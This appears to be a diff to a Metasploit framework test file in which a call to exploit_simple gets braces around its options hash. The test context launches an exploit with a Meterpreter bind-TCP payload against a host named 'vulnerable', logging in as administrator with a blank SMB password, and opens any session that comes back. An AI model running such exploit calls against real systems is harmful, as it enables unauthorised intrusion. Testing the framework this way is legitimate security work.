@@ -165,12 +165,12 @@ module MsfTest
       payload_name = 'windows/meterpreter/bind_tcp'
 
       ## Fire it off against a known-vulnerable host
-      session = @framework.exploits.create(exploit_name).exploit_simple(
+      session = @framework.exploits.create(exploit_name).exploit_simple({
         'Options' => { 'RHOST' => "vulnerable", "SMBUser" => "administrator", "SMBPass" => "" },
         'Payload' => payload_name,
         'LocalInput' => input,
         'LocalOutput' => output
-      )
+      })
 
       ## If a session came back, try to interact with it.
       if session
